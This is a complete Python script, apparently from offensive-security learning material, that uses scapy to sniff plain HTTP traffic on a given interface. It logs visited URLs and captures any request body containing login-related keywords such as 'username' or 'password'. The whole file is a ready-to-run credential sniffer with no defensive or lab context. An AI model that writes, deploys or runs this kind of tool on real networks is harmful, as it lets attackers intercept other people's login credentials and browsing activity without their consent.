#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

def sniff(interface):
    try:
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp port 80")
    except Exception as e:
        logging.error(f"Error sniffing on interface {interface}: {str(e)}")

def get_url(packet):
    try:
        return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
    except Exception as e:
        logging.error(f"Error getting URL from packet: {str(e)}")
        return None

def get_login_info(packet):
    try:
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode()
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
        return None
    except UnicodeDecodeError:
        logging.warning("Could not decode Raw layer data")
        return None

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if url:
            logging.info(f"[+] HTTP Request >> {url}")

        login_info = get_login_info(packet)
        if login_info:
            logging.info(f"\n\n[+] Possible username/password > {login_info}\n\n")

if __name__ == "__main__":
    # Use argparse for command-line arguments
    parser = argparse.ArgumentParser(description="A simple HTTP packet sniffer")
    parser.add_argument("-i", "--interface", dest="interface", help="Network interface to sniff on (e.g., eth0)", required=True)
    args = parser.parse_args()

    sniff(args.interface)
